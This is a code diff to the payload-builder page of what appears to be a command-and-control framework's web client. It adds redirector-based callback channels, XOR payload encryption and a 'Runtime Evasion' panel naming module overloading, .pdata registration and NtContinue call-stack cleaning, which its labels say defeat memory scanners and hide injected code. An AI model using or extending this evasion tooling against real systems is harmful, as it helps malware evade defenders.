@@ -25,6 +25,7 @@ import type {
   YaraWarning,
 } from '@/gen/specter/v1/builder_pb'
 import type { ProfileInfo } from '@/gen/specter/v1/profiles_pb'
+import type { RedirectorInfo } from '@/gen/specter/v1/azure_pb'
 
 // ── Helpers ──────────────────────────────────────────────────────────────
 
@@ -206,6 +207,7 @@ export function PayloadBuilder() {
   // Data
   const [formats, setFormats] = useState<FormatDescription[]>([])
   const [profiles, setProfiles] = useState<ProfileInfo[]>([])
+  const [redirectors, setRedirectors] = useState<RedirectorInfo[]>([])
   const [loading, setLoading] = useState(true)
   const [error, setError] = useState<string | null>(null)
 
@@ -228,6 +230,12 @@ export function PayloadBuilder() {
   const [junkCodeInsertion, setJunkCodeInsertion] = useState(false)
   const [junkDensity, setJunkDensity] = useState(8)
   const [controlFlowFlattening, setControlFlowFlattening] = useState(false)
+  const [xorEncryption, setXorEncryption] = useState(false)
+
+  // Evasion
+  const [moduleOverloading, setModuleOverloading] = useState(false)
+  const [pdataRegistration, setPdataRegistration] = useState(false)
+  const [ntcontinueEntry, setNtcontinueEntry] = useState(false)
 
   // Build state
   const [building, setBuilding] = useState(false)
@@ -239,9 +247,10 @@ export function PayloadBuilder() {
     try {
       setLoading(true)
       setError(null)
-      const [fmtRes, profRes] = await Promise.allSettled([
+      const [fmtRes, profRes, redirRes] = await Promise.allSettled([
         specterClient.listFormats({}),
         specterClient.listProfiles({}),
+        specterClient.listRedirectors({}),
       ])
       if (fmtRes.status === 'fulfilled') setFormats(fmtRes.value.formats)
       if (profRes.status === 'fulfilled') {
@@ -249,6 +258,9 @@ export function PayloadBuilder() {
         if (profRes.value.profiles.length > 0 && !selectedProfile) {
           setSelectedProfile(profRes.value.profiles[0].name)
         }
+      }
+      if (redirRes.status === 'fulfilled') {
+        setRedirectors(redirRes.value.redirectors.filter((r) => r.state === 'Active'))
       }
       if (fmtRes.status === 'rejected' && profRes.status === 'rejected') {
         setError('Unable to connect to teamserver')
@@ -315,6 +327,7 @@ export function PayloadBuilder() {
         junkCodeInsertion,
         junkDensity,
         controlFlowFlattening,
+        xorEncryption,
       })
 
       let killDateUnix = BigInt(0)
@@ -333,6 +346,11 @@ export function PayloadBuilder() {
         proxyTarget,
         serviceName,
         stagerUrl,
+        evasion: {
+          moduleOverloading,
+          pdataRegistration,
+          ntcontinueEntry,
+        },
       })
 
       const res = await specterClient.generatePayload(req)
@@ -354,6 +372,10 @@ export function PayloadBuilder() {
     junkCodeInsertion,
     junkDensity,
     controlFlowFlattening,
+    xorEncryption,
+    moduleOverloading,
+    pdataRegistration,
+    ntcontinueEntry,
     proxyTarget,
     serviceName,
     stagerUrl,
@@ -486,13 +508,41 @@ export function PayloadBuilder() {
             <section className="rounded-lg border border-specter-border bg-specter-surface p-4">
               <div className="mb-3 flex items-center justify-between">
                 <h2 className="text-xs font-medium text-specter-text">Callback Channels</h2>
-                <button
-                  onClick={addChannel}
-                  className="flex items-center gap-1 rounded border border-specter-border px-2 py-1 text-[10px] text-specter-muted transition-colors hover:text-specter-text"
-                >
-                  <Plus className="h-3 w-3" />
-                  Add
-                </button>
+                <div className="flex gap-1">
+                  {redirectors.length > 0 && (
+                    <select
+                      onChange={(e) => {
+                        const redir = redirectors.find((r) => r.id === e.target.value)
+                        if (redir) {
+                          const proto = redir.domain.includes('://') ? '' : 'https://'
+                          setChannels((prev) => [
+                            ...prev,
+                            { id: Math.max(0, ...prev.map((c) => c.id)) + 1, kind: 'https', address: `${proto}${redir.domain}` },
+                          ])
+                        }
+                        e.target.value = ''
+                      }}
+                      className="rounded border border-specter-border bg-specter-bg px-2 py-1 text-[10px] text-specter-muted focus:border-specter-accent focus:outline-none"
+                      defaultValue=""
+                    >
+                      <option value="" disabled>
+                        + From Redirector
+                      </option>
+                      {redirectors.map((r) => (
+                        <option key={r.id} value={r.id}>
+                          {r.name} ({r.domain})
+                        </option>
+                      ))}
+                    </select>
+                  )}
+                  <button
+                    onClick={addChannel}
+                    className="flex items-center gap-1 rounded border border-specter-border px-2 py-1 text-[10px] text-specter-muted transition-colors hover:text-specter-text"
+                  >
+                    <Plus className="h-3 w-3" />
+                    Custom
+                  </button>
+                </div>
               </div>
               <div className="space-y-2">
                 {channels.map((ch, idx) => (
@@ -714,6 +764,75 @@ export function PayloadBuilder() {
                     <div className="text-xs text-specter-text">Control Flow Flattening</div>
                     <div className="text-[10px] text-specter-warning">
                       Heavy transform — increases payload size significantly
+                    </div>
+                  </div>
+                </label>
+
+                <label className="flex items-center gap-2.5">
+                  <input
+                    type="checkbox"
+                    checked={xorEncryption}
+                    onChange={(e) => setXorEncryption(e.target.checked)}
+                    className="rounded border-specter-border"
+                  />
+                  <div>
+                    <div className="text-xs text-specter-text">XOR Encryption</div>
+                    <div className="text-[10px] text-specter-muted">
+                      Encrypt blob with per-build 128-byte key + decryption stub
+                    </div>
+                  </div>
+                </label>
+              </div>
+            </section>
+
+            {/* Runtime Evasion */}
+            <section className="rounded-lg border border-specter-border bg-specter-surface p-4">
+              <div className="mb-3 flex items-center gap-1.5">
+                <Shield className="h-3.5 w-3.5 text-specter-accent" />
+                <h2 className="text-xs font-medium text-specter-text">Runtime Evasion</h2>
+              </div>
+              <div className="space-y-3">
+                <label className="flex items-center gap-2.5">
+                  <input
+                    type="checkbox"
+                    checked={moduleOverloading}
+                    onChange={(e) => setModuleOverloading(e.target.checked)}
+                    className="rounded border-specter-border"
+                  />
+                  <div>
+                    <div className="text-xs text-specter-text">Module Overloading</div>
+                    <div className="text-[10px] text-specter-muted">
+                      Load into file-backed section (NtCreateSection) — defeats memory scanners
+                    </div>
+                  </div>
+                </label>
+
+                <label className="flex items-center gap-2.5">
+                  <input
+                    type="checkbox"
+                    checked={pdataRegistration}
+                    onChange={(e) => setPdataRegistration(e.target.checked)}
+                    className="rounded border-specter-border"
+                  />
+                  <div>
+                    <div className="text-xs text-specter-text">.pdata Registration</div>
+                    <div className="text-[10px] text-specter-muted">
+                      Register exception handling data (RtlAddFunctionTable) — hides injected code
+                    </div>
+                  </div>
+                </label>
+
+                <label className="flex items-center gap-2.5">
+                  <input
+                    type="checkbox"
+                    checked={ntcontinueEntry}
+                    onChange={(e) => setNtcontinueEntry(e.target.checked)}
+                    className="rounded border-specter-border"
+                  />
+                  <div>
+                    <div className="text-xs text-specter-text">NtContinue Entry</div>
+                    <div className="text-[10px] text-specter-muted">
+                      Clean initial call stack via synthetic thread context transfer
                     </div>
                   </div>
                 </label>
